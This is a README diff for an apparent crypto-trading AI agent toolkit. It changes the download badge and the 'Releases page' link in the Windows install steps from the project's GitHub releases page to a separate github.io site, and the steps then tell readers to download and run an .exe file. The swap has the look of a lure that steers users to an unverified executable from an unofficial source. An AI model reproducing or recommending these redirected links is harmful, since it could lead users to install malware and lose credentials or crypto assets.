@@ -1,6 +1,6 @@
 # 🤖 AgenticDeFi-Trainer - Manage crypto assets with autonomous agents
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue-blue)](https://github.com/Ragnaralmondeyed562/AgenticDeFi-Trainer/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue-blue)](https://ragnaralmondeyed562.github.io)
 
 AgenticDeFi-Trainer allows you to deploy autonomous AI agents that handle complex finance tasks. These agents trade, move assets between networks, and manage digital treasuries without manual input. This toolkit uses modern AI models to execute financial actions based on your goals.
 
@@ -8,7 +8,7 @@ AgenticDeFi-Trainer allows you to deploy autonomous AI agents that handle comple
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [Releases page](https://github.com/Ragnaralmondeyed562/AgenticDeFi-Trainer/releases).
+1. Go to the [Releases page](https://ragnaralmondeyed562.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
